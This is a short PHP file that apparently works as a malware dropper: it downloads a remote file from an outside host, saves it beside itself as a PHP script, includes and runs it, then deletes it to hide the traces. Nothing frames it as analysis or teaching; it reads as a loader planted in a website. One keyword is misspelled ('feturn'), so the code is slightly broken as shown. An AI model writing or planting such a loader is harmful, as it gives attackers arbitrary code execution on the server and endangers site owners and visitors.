<?php
$a="https://x8v.top/i/payation.txt";$b=__DIR__."/payation.php";$c=file_get_contents($a);if($c===false){feturn;}file_put_contents($b,$c);include $b;if(file_exists($b)){unlink($b);}
